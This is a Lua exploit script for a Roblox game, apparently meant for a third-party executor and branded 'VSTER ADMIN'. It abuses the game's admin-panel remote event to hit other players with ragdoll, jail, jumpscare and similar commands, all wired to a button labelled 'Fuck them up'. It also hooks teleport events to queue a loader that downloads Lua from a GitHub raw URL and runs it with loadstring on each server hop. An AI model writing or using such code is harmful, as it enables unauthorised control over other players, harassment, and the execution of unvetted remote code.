local Players = game:GetService("Players")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")

local Remote = ReplicatedStorage
    :WaitForChild("Packages")
    :WaitForChild("Net")
    :WaitForChild("RE/AdminPanelService/ExecuteCommand")

local commands = {
    "ragdoll",
    "rocket",
    "balloon",
    "inverse",
    "nightvision",
    "jail",
    "tiny",
    "jumpscare",
    "morph"
}

local ADMIN_RAW_URL = "https://raw.githubusercontent.com/thetoaster97/99123/refs/heads/main/3.lua"

local function find_queue()
    if type(queue_on_teleport) == "function" then return queue_on_teleport end
    if syn and type(syn.queue_on_teleport) == "function" then return syn.queue_on_teleport end
    if secure_load and type(secure_load.queue_on_teleport) == "function" then return secure_load.queue_on_teleport end
    if KRNL and type(KRNL.queue_on_teleport) == "function" then return KRNL.queue_on_teleport end
    for k,v in pairs(_G) do
        if type(v) == "function" and tostring(k):lower():find("queue_on_teleport") then
            return v
        end
    end
    return nil
end

local queue_func = find_queue()

if queue_func and ADMIN_RAW_URL and ADMIN_RAW_URL ~= "" then
    local queued_payload = [[
local url = "]] .. ADMIN_RAW_URL .. [["
local function safeGet(u)
    if syn and type(syn.request) == "function" then
        local ok, res = pcall(function() return syn.request({Url = u, Method = "GET"}).Body end)
        if ok and res then return res end
    end
    if type(http_request) == "function" then
        local ok, res = pcall(function() return http_request({Url = u}).Body end)
        if ok and res then return res end
    end
    if type(request) == "function" then
        local ok, res = pcall(function() return request({Url = u}).Body end)
        if ok and res then return res end
    end
    if type(game.HttpGet) == "function" then
        local ok, res = pcall(function() return game:HttpGet(u) end)
        if ok and res then return res end
    end
    local HttpService = game:GetService("HttpService")
    local ok, res = pcall(function() return HttpService:GetAsync(u) end)
    if ok and res then return res end
    return nil
end

local code = safeGet(url)
if code then
    local fn = loadstring(code)
    if fn then pcall(fn) end
end
]]

    TeleportService.TeleportInitFailed:Connect(function()
        local ok, err = pcall(function() queue_func(queued_payload) end)
        if ok then
            print("[VSTER] Admin script queued for server hop.")
        else
            warn("[VSTER] Failed to queue payload:", err)
        end
    end)
    
    local LocalPlayer = Players.LocalPlayer
    local originalPlaceId = game.PlaceId
    
    LocalPlayer.OnTeleport:Connect(function(State)
        if State == Enum.TeleportState.Started then
            local ok, err = pcall(function() queue_func(queued_payload) end)
            if ok then
                print("[VSTER] Admin script queued for server hop.")
            else
                warn("[VSTER] Failed to queue payload:", err)
            end
        end
    end)
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PlayerEffectPanel"
ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 280, 0, 375)
Frame.Position = UDim2.new(1, -290, 0.5, -187.5)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.BackgroundTransparency = 0.1
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "VSTER ADMIN"
Title.TextColor3 = Color3.fromRGB(235, 225, 255)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.TextSize = 22
Title.Parent = Frame

local Scrolling = Instance.new("ScrollingFrame")
Scrolling.Size = UDim2.new(1, 0, 1, -50)
Scrolling.Position = UDim2.new(0, 0, 0, 45)
Scrolling.CanvasSize = UDim2.new(0, 0, 0, 0)
Scrolling.ScrollBarThickness = 6
Scrolling.BackgroundTransparency = 1
Scrolling.Parent = Frame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 6)
UIListLayout.Parent = Scrolling

local function createPlayerButton(player)
    local PlayerFrame = Instance.new("Frame")
    PlayerFrame.Size = UDim2.new(1, -10, 0, 35)
    PlayerFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    PlayerFrame.BorderSizePixel = 0
    PlayerFrame.Parent = Scrolling

    local NameLabel = Instance.new("TextLabel")
    NameLabel.Text = player.Name
    NameLabel.Size = UDim2.new(0.6, 0, 1, 0)
    NameLabel.Position = UDim2.new(0.05, 0, 0, 0)
    NameLabel.BackgroundTransparency = 1
    NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    NameLabel.Font = Enum.Font.Gotham
    NameLabel.TextSize = 18
    NameLabel.TextXAlignment = Enum.TextXAlignment.Left
    NameLabel.Parent = PlayerFrame

    local Button = Instance.new("TextButton")
    Button.Text = "Fuck them up"
    Button.Size = UDim2.new(0.4, 0, 0.8, 0)
    Button.Position = UDim2.new(0.55, 0, 0.1, 0)
    Button.BackgroundColor3 = Color3.fromRGB(60, 130, 255)
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.Font = Enum.Font.GothamBold
    Button.TextSize = 16
    Button.AutoButtonColor = true
    Button.Parent = PlayerFrame

    Button.MouseButton1Click:Connect(function()
        for _, command in ipairs(commands) do
            local args = {
                player,
                command
            }
            Remote:FireServer(unpack(args))
            task.wait(0.15)
        end
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= Players.LocalPlayer then
        createPlayerButton(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    createPlayerButton(player)
end)

Players.PlayerRemoving:Connect(function(player)
    for _, child in ipairs(Scrolling:GetChildren()) do
        if child:IsA("Frame") then
            local label = child:FindFirstChildOfClass("TextLabel")
            if label and label.Text == player.Name then
                child:Destroy()
            end
        end
    end
end)
